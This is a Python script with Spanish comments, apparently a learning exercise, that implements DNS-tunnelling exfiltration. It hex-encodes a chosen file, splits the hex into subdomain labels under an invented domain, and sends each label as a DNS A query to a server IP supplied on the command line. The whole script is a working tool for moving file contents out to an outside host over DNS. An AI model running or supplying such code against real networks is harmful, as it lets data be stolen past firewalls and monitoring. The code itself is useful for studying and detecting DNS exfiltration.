import argparse
import binascii
import os
import time

import dns.message
import dns.query

port = 53                   # Puerto
domain = "ass.com"          # Nombre de dominio inventado
subdomains = []             # Creamos una lista para almacenar los subdominios
line_length = 53            # Longitud que tendras los subdominios
inicio = "----INICIO----"
fin = "----FIN----"


def flags_func():
    # Creamos el parseador
    parser = argparse.ArgumentParser()
    # Añadimos los argumentos
    parser.add_argument("-f", required=True, help="Nombre del archivo")
    parser.add_argument("-s", required=True, help="IP del servidor")
    parser.add_argument("-t", required=True, help="Timeout del servidor")
    # Parseamos los arumentos al script
    args = parser.parse_args()
    # Declaramos los argumentos
    file = args.f
    server = args.s
    timeout = args.t
    # Devlovemos la variable del nombre del archivo
    return [file, server, timeout]


def file_func(file_name):
    # Hacemos el manejo de archivos.
    with open(file_name, "r") as archivo:
        text = archivo.read()
    # Primero pasamos los datos a ASCII en bytes.
    text = bytes(text, "utf-8")
    # Luego pasamos estos mismos datos a Hexadeciaml, pero estan en bytes.
    text = binascii.hexlify(text)
    # Y finalmente los datos se pasan a utf-8.
    text = text.decode("utf-8")
    return text


def length_func(text):
    fin = "----FIN----"
    # Calculamos la cantidad de bloques que tendra el mensaje.
    num = len(text) // line_length
    # Iteramos cada bloque.
    for subdomain in range(num):
        subdomain = (text[subdomain*line_length:(subdomain+1)*line_length])
        # Metemos los subdominios a la lista previamente declarada.
        subdomains.append(subdomain)
    # Comprobamos que no queden bloques incompletos.
    if len(text) % line_length != 0:
        subdomain = (text[num*line_length:])
        # Metemos el subdominio a la lista previamente declarada.
        subdomains.append(subdomain)
    # Codificamos el mensaje final.
    fin = bytes(fin, "utf-8")
    fin = binascii.hexlify(fin)
    fin = fin.decode("utf-8")
    # Y añadimos el mensaje a la lista con los subdominios.
    subdomains.append(fin)


def main():
    # Primero limpiamos la pantalla.
    os.system("clear")
    print(inicio)
    # Ejecutamos la funcion para los argumentos, y guardamos la respuesta en la variable.
    arg_file, arg_server, arg_timeout = flags_func()
    file_name = arg_file
    server = arg_server
    timeout = arg_timeout
    timeout = int(timeout)
    print("Datos sacados del archivo: ", file_name, "\n")
    # Ejecutamos la funcion con el parametro pasado.
    text = file_func(file_name)
    # Ejecutamos la funcion con el parametro pasado.
    length_func(text)
    # iteramos cada subdominio de la lista de subdominios.
    for subdomain in subdomains:
        print("-------------------------------")
        print("Paquete n: ", subdomains.index(subdomain) + 1, "enviando...")
        print("Subdominio: ", subdomain)
        # Declaramos los dominios completos.
        domain_full = subdomain + "." + domain
        # Creamos la peticion DNS del registro A
        request = dns.message.make_query(domain_full, dns.rdatatype.A)
        # Enviamos la respuesta al servidor DNS con un timeout asignado con parametros por consola.
        response = dns.query.udp(request, server, timeout=timeout)
        time.sleep(0.5)
        # Imprimimos la respuesta recibida. Confirmando que se han recibido los datos.
        print(response)
    print(fin)


if __name__ == "__main__":
    main()
